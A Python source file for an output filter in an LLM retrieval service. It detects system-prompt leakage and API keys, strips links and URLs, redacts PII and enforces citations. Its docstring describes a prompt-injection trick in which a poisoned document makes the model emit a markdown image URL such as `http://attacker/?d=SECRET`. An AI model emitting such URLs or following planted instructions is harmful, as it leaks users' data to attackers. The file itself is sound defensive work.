"""Output guard — runs AFTER generation, before the response leaves the service.

Layers, fail-closed where the threat warrants it:

1. Leakage/secret detection (HARD REFUSAL). If the answer contains fingerprints of our
   own system prompt or anything that looks like a Groq API key, replace it with the
   canonical refusal — never return the model's words.
2. Exfil channel stripping (SANITIZE). Markdown images, markdown links, and bare URLs
   are removed. This kills the `![](http://attacker/?d=SECRET)` trick where a poisoned
   document tries to coerce the model into emitting a URL that, when rendered, leaks
   data via the browser's GET request to attacker-controlled infrastructure.
3. PII redaction (SANITIZE). Common patterns (email, US SSN) are replaced. NOTE: this is
   a deliberately lightweight regex layer; the production-grade choice is Microsoft
   Presidio (already listed in requirements.txt) which adds NER-based names/locations
   detection — the trade-off is +600 MB of spaCy/torch deps for the demo. Documented as
   such in the README.
4. Citation enforcement (HARD REFUSAL). Every non-refusal answer must contain at least
   one `[<source>.pdf p.<N>]` citation whose source is in the retrieved set. An answer
   without a valid citation is by definition ungrounded — refuse rather than ship it.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from app.llm import REFUSAL_NO_CONTEXT


@dataclass
class FilteredOutput:
    text: str
    blocked: bool = False
    notes: str = ""


# --- layer 1: leakage fingerprints + secret patterns ---

# Substrings unique to our internal prompting that should never appear in a model answer.
# If they do, the model has either been coerced into echoing the system prompt or has
# leaked the untrusted-data framing — either way, refuse.
_SYSTEM_FINGERPRINTS = (
    "UNTRUSTED data",
    "<DOC-",
    "</DOC-",
    "Reference passages:",
)

# Groq API keys start with `gsk_`. We never put the key in any prompt, but defense-in-depth:
# if one ever appears in an output, hard-refuse.
_SECRET_PATTERNS = (
    re.compile(r"gsk_[A-Za-z0-9_]{20,}"),
)


# --- layer 2: exfil channels (markdown links/images, bare URLs) ---

_MARKDOWN_IMG = re.compile(r"!\[[^\]]*\]\([^)]*\)")
# Note: deliberately requires `(url)` after `]` so legitimate citations like
# `[rag.pdf p.5]` (which have no parentheses) are NOT matched.
_MARKDOWN_LINK = re.compile(r"\[[^\]]*\]\([^)]*\)")
_BARE_URL = re.compile(r"https?://\S+")


def _strip_exfil(text: str) -> tuple[str, bool]:
    orig = text
    text = _MARKDOWN_IMG.sub("", text)
    text = _MARKDOWN_LINK.sub("", text)
    text = _BARE_URL.sub("", text)
    return text, text != orig


# --- layer 3: PII (lightweight) ---

_EMAIL_RE = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b")
_US_SSN_RE = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")


def _redact_pii(text: str) -> tuple[str, int]:
    count = 0

    def _email_sub(_m: re.Match) -> str:
        nonlocal count
        count += 1
        return "[email redacted]"

    def _ssn_sub(_m: re.Match) -> str:
        nonlocal count
        count += 1
        return "[SSN redacted]"

    text = _EMAIL_RE.sub(_email_sub, text)
    text = _US_SSN_RE.sub(_ssn_sub, text)
    return text, count


# --- layer 4: citation enforcement ---

# Matches the inline-citation format llm.py instructs the model to use:
#   [<filename>.pdf p.<int>]   e.g.  [rag_retrieval_augmented_generation.pdf p.5]
_CITATION_RE = re.compile(r"\[(\S+?\.pdf)\s+p\.\d+\]")


def _has_valid_citation(text: str, allowed_sources: list[str]) -> bool:
    allowed = set(allowed_sources)
    return any(m.group(1) in allowed for m in _CITATION_RE.finditer(text))


# --- entrypoint ---


def filter_output(answer: str, allowed_sources: list[str]) -> FilteredOutput:
    text = (answer or "").strip()
    notes: list[str] = []

    # 1. Hard refusals first (leakage / secret) — before any sanitization that might
    #    mask the offending strings.
    for fp in _SYSTEM_FINGERPRINTS:
        if fp in text:
            return FilteredOutput(text=REFUSAL_NO_CONTEXT, blocked=True, notes=f"leakage:{fp}")
    for pat in _SECRET_PATTERNS:
        if pat.search(text):
            return FilteredOutput(text=REFUSAL_NO_CONTEXT, blocked=True, notes="secret_detected")

    # 2. Strip exfil channels in place.
    text, stripped = _strip_exfil(text)
    if stripped:
        notes.append("links_stripped")

    # 3. PII redaction in place.
    text, n_pii = _redact_pii(text)
    if n_pii:
        notes.append(f"pii_redacted:{n_pii}")

    # 4. Citation enforcement (skip if the model produced the canonical refusal).
    if text != REFUSAL_NO_CONTEXT and not _has_valid_citation(text, allowed_sources):
        return FilteredOutput(text=REFUSAL_NO_CONTEXT, blocked=True, notes="ungrounded")

    return FilteredOutput(text=text, notes=";".join(notes))
